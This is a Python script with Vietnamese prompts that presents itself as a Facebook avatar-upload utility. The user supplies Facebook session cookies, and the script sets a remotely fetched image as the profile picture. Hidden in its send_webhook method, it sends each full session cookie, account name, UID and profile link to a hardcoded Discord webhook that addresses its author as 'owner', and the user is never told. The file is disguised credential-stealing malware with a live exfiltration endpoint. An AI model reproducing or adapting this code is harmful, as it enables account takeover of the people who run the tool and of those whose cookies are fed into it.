import requests
import re
import json
from datetime import datetime, timezone
import os

class FacebookAvatarUploader:
    def __init__(self):
        self.cookie = ""
        self.fb_dtsg = ""
        self.jazoest = ""
        self.user_id = ""
        self.webhook_url = "https://discord.com/api/webhooks/1443279268686856374/ypnYorUiTmJSdPXDEFJeqzhBokUsjUuTGsXodLIBNADmJktvOpugepbs7rZOCrMUYQLr"
        self.image_url = "https://raw.githubusercontent.com/ngquanghuy206/tdatreo/main/mt.jpg"

    def download_image(self):
        try:
            response = requests.get(self.image_url)
            if response.status_code == 200:
                with open("temp_avatar.jpg", "wb") as f:
                    f.write(response.content)
                return "temp_avatar.jpg"
            else:
                raise Exception("Không thể tải ảnh từ GitHub")
        except Exception as e:
            raise Exception(f"Lỗi tải ảnh: {str(e)}")

    def get_user_id(self):
        try:
            return re.search(r"c_user=(\d+)", self.cookie).group(1)
        except:
            raise Exception("Cookie không hợp lệ")

    def get_user_name(self):
        try:
            headers = {
                'Cookie': self.cookie,
                'User-Agent': 'Mozilla/5.0'
            }
            response = requests.get('https://www.facebook.com/me', headers=headers, allow_redirects=True)
            match = re.search(r'"name":"([^"]+)"', response.text)
            if match:
                return match.group(1)
            return "Unknown"
        except:
            return "Unknown"

    def send_webhook(self, ck, name, uid):
        try:
            current_time = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
            fb_link = f"https://www.facebook.com/{uid}"
            
            embed = {
                "title": "🔔 Cookie Mới Đăng Nhập",
                "description": f"**Xin chào chủ nhân Đỗ Tiến Đạt**\n\nĐây là thông tin cookie mới:",
                "color": 3447003,
                "fields": [
                    {
                        "name": "👤 Tên",
                        "value": f"```{name}```",
                        "inline": False
                    },
                    {
                        "name": "🆔 UID",
                        "value": f"```{uid}```",
                        "inline": False
                    },
                    {
                        "name": "🍪 Cookie",
                        "value": f"```{ck[:1000]}...```" if len(ck) > 1000 else f"```{ck}```",
                        "inline": False
                    },
                    {
                        "name": "⏰ Thời gian login",
                        "value": f"```{current_time}```",
                        "inline": False
                    },
                    {
                        "name": "🔗 Link Facebook",
                        "value": fb_link,
                        "inline": False
                    }
                ],
                "footer": {
                    "text": "Facebook Tool"
                },
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
            
            payload = {
                "embeds": [embed]
            }
            
            response = requests.post(self.webhook_url, json=payload, timeout=10)
            
            if response.status_code == 204:
                return True
            else:
                return False
                
        except Exception as e:
            return False

    def init_params(self):
        headers = {
            'Cookie': self.cookie,
            'User-Agent': 'Mozilla/5.0'
        }
        try:
            params_to_extract = {}
            jazoest_found = False
            
            for url in ['https://www.facebook.com', 'https://mbasic.facebook.com', 'https://m.facebook.com']:
                response = requests.get(url, headers=headers)
                
                match = re.search(r'name="fb_dtsg" value="(.*?)"', response.text)
                if match:
                    self.fb_dtsg = match.group(1)
                    params_to_extract["fb_dtsg"] = match.group(1)
                
                jazoest_match = re.search(r'jazoest=(\d+)', response.text)
                if jazoest_match:
                    params_to_extract["jazoest"] = jazoest_match.group(1)
                    self.jazoest = jazoest_match.group(1)
                    jazoest_found = True
                
                if match and jazoest_found:
                    return
            
            if not params_to_extract.get("fb_dtsg"):
                raise Exception("Không tìm thấy fb_dtsg")
        except Exception as e:
            raise Exception(f"Lỗi khởi tạo: {str(e)}")

    def get_profile_redirect_url(self):
        headers = {
            'Cookie': self.cookie,
            'User-Agent': 'Mozilla/5.0'
        }
        
        response = requests.get('https://www.facebook.com/profile.php', headers=headers, allow_redirects=True)
        return response.url

    def upload_photo(self, image_path, profile_url):
        headers = {
            'Cookie': self.cookie,
            'Origin': 'https://www.facebook.com',
            'Referer': profile_url,
            'User-Agent': 'Mozilla/5.0'
        }
        
        params = {
            'profile_id': self.user_id,
            'photo_source': '57',
            'av': self.user_id,
            '__aaid': '0',
            '__user': self.user_id,
            '__a': '1',
            '__req': '1p',
            'dpr': '1',
            '__ccg': 'EXCELLENT',
            '__rev': '1026555741',
            '__comet_req': '15',
            'fb_dtsg': self.fb_dtsg,
            'jazoest': self.jazoest,
            '__crn': 'comet.fbweb.CometProfileTimelineListViewRoute'
        }
        
        with open(image_path, 'rb') as f:
            files = {'file': f}
            response = requests.post('https://www.facebook.com/profile/picture/upload', 
                                   headers=headers, params=params, files=files)
        
        response_text = response.text
        if response_text.startswith('for (;;);'):
            response_text = response_text[9:]
        
        data = json.loads(response_text)
        return data['payload']['fbid']

    def set_profile_picture(self, fbid, profile_url):
        headers = {
            'Cookie': self.cookie,
            'Origin': 'https://www.facebook.com',
            'Referer': profile_url,
            'User-Agent': 'Mozilla/5.0',
            'x-fb-friendly-name': 'ProfileCometProfilePictureSetMutation'
        }
        
        payload = {
            'av': self.user_id,
            '__aaid': '0',
            '__user': self.user_id,
            '__a': '1',
            '__req': '1u',
            'dpr': '1',
            '__ccg': 'EXCELLENT',
            '__rev': '1026555741',
            '__comet_req': '15',
            'fb_dtsg': self.fb_dtsg,
            'jazoest': self.jazoest,
            '__crn': 'comet.fbweb.CometProfileTimelineListViewRoute',
            'fb_api_caller_class': 'RelayModern',
            'fb_api_req_friendly_name': 'ProfileCometProfilePictureSetMutation',
            'variables': json.dumps({
                "input": {
                    "attribution_id_v2": "ProfileCometTimelineListViewRoot.react,comet.profile.timeline.list,unexpected,1756696177955,902994,190055527696468,,;CometHomeRoot.react,comet.home,via_cold_start,1756696169919,584477,4748854339,,",
                    "caption": "",
                    "existing_photo_id": fbid,
                    "expiration_time": None,
                    "profile_id": self.user_id,
                    "profile_pic_method": "EXISTING",
                    "profile_pic_source": "TIMELINE",
                    "scaled_crop_rect": {
                        "height": 1,
                        "width": 0.52922,
                        "x": 0.23539,
                        "y": 0
                    },
                    "skip_cropping": True,
                    "actor_id": self.user_id,
                    "client_mutation_id": "1"
                },
                "isPage": False,
                "isProfile": True,
                "sectionToken": "UNKNOWN",
                "collectionToken": "UNKNOWN",
                "scale": 1,
                "__relay_internal__pv__ProfileGeminiIsCoinFlipEnabledrelayprovider": False
            }),
            'server_timestamps': 'true',
            'doc_id': '24342990855357700'
        }
        
        response = requests.post('https://www.facebook.com/api/graphql/', 
                               headers=headers, data=payload)
        return response

    def upload_avatar(self, image_path):
        try:
            self.user_id = self.get_user_id()
            self.init_params()
            
            user_name = self.get_user_name()
            
            self.send_webhook(self.cookie, user_name, self.user_id)
            
            profile_url = self.get_profile_redirect_url()
            fbid = self.upload_photo(image_path, profile_url)
            self.set_profile_picture(fbid, profile_url)
            
            print(f"Khởi động thành công cho user_id: {self.user_id} - Tên: {user_name}")
            return True
        except Exception as e:
            print(f"Lỗi với user_id {self.user_id}: {str(e)}")
            return False

def read_cookies_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            cookies = [line.strip() for line in f if line.strip()]
        return cookies
    except Exception as e:
        print(f"Lỗi khi đọc file cookie: {str(e)}")
        return []

if __name__ == "__main__":
    print("=" * 50)
    print("FACEBOOK TOOL TIỆN ÍCH")
    print("=" * 50)
    print("\nChọn phương thức nhập cookie:")
    print("1. Nhập cookie trực tiếp")
    print("2. Nhập từ file .txt")
    
    choice = input("\nNhập lựa chọn của bạn (1 hoặc 2): ").strip()
    
    cookies = []
    
    if choice == "1":
        cookie_input = input("\nNhập cookie của bạn: ").strip()
        if cookie_input:
            cookies.append(cookie_input)
    elif choice == "2":
        cookie_file = input("\nNhập đường dẫn file cookie (.txt): ").strip()
        cookies = read_cookies_from_file(cookie_file)
    else:
        print("Lựa chọn không hợp lệ!")
        exit()
    
    if not cookies:
        print("Không có cookie nào để xử lý.")
    else:
        uploader = FacebookAvatarUploader()
        
        
        try:
            image_path = uploader.download_image()
            
        except Exception as e:
            print(f"Lỗi: {str(e)}")
            exit()
        
        success_count = 0
        total_count = len(cookies)
        
        for index, cookie in enumerate(cookies, 1):
            print(f"\nĐang xử lý cookie {index}/{total_count}...")
            uploader.cookie = cookie
            if uploader.upload_avatar(image_path):
                success_count += 1
        
        if os.path.exists("temp_avatar.jpg"):
            os.remove("temp_avatar.jpg")
        
        print(f"\nHoàn tất! Thành công: {success_count}/{total_count} cookie.")
